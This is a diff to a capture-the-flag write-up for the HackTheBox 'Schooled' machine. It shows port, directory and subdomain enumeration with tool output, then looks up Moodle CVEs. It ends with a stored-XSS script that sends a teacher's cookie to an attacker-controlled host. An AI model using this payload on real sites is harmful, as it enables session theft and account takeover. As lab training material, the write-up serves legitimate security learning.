@@ -15,7 +15,7 @@
 
 * Find subdomain
 * Use XSS to steel teacher's cookie
-* Privilege escalation from teatcher to administrator of site
+* Privilege escalation from teatcher to administrator of site with CVE
 * Upload PHP reverse shell
 * Find credentional to connect to mysql databases
 * Crack bcrypt hash
@@ -97,9 +97,137 @@ Nmap done: 1 IP address (1 host up) scanned in 927.00 seconds
 
 ```
 
+After reconnig we get 3 ports: 22/TCP SSH, 80/TCP HTTP, 33060/tcp mysql.
 
+Let's start exploring web site.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+It's site of education programm. Finding some info about prospective usersю
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+Also we see interesting page *schooled.htb/contact.html*. Trying to exploit CSRF, SSTI, SQL Inj. Every time we get 404 Error when trying to get a quote.
+
+There isn't something interesting in the source code too.
+
+## Gobuster
+
+Let's try to find something interesting in direcories of web server.
+
+```
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# gobuster dir -e -u http://Schooled.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,301,302
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://Schooled.htb/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,301,302
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     rar,tar,html,phtml,zip,js,php,txt,htm
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2021/04/30 00:49:43 Starting gobuster
+===============================================================
+http://Schooled.htb/about.html (Status: 200)
+http://Schooled.htb/contact.html (Status: 200)
+http://Schooled.htb/css (Status: 301)
+http://Schooled.htb/fonts (Status: 301)
+http://Schooled.htb/images (Status: 301)
+http://Schooled.htb/index.html (Status: 200)
+http://Schooled.htb/index.html (Status: 200)
+http://Schooled.htb/js (Status: 301)
+===============================================================
+2021/04/30 01:07:38 Finished
+===============================================================
+```
+
+And we get no result.
+
+##ffuf
+
+Let's try to find subdomains of web server.
+
+```
+┌──(root💀kali)-[/home/kali]
+└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb/ -H "Host:FUZZ.schooled.htb" -fw 5338
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://schooled.htb/
+ :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.schooled.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response words: 5338
+________________________________________________
+
+moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
+:: Progress: [114441/114441] :: Job [1/1] :: 144 req/sec :: Duration: [0:13:04] :: Errors: 0 ::
+```
+
+And we find out about the subdomain *moodle*. Add `moodle.schooled.htb` to /etc/hosts.
+
+Let's see on this web page.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+We see four available courses and form to log in.
 
 # Explotation
+
+> *Moodle* is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.
+it is used to create private websites with online courses for educators and trainers to achieve learning goals.[10][11] Moodle allows for extending and tailoring learning environments using community-sourced plugins.
+
+After register and login we can enroll to course Mathematics of teacher Manuel Phillips.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+In the course we see two messages
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+One of messages is interesting...
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+
+Ok, I think we need to start searching some CVE for *moodle*
+
+* https://www.cybersecurity-help.cz/vdb/SB2020072004
+* https://www.cybersecurity-help.cz/vulnerabilities/31682/
+
+First link says us dbout XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 
+
+Second link says that remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.
+
+Also i find [POC](https://www.youtube.com/watch?v=BkEInFI4oIU) for CVE-2020-14321 and [profile of github](https://github.com/HoangKien1020/CVE-2020-14321) with this payload.
+
+We knows that teacher will check links of MoodleNet in student's profiles form the message *Reminder for joining students*.
+
+We can steel cookie's teacher with XSS attack. There is the good [article](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md) about it.
+
+Let's edit our profile and use this XSS.
+
+```
+<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
+```
+
 
 
 # Privilege Escalation#1
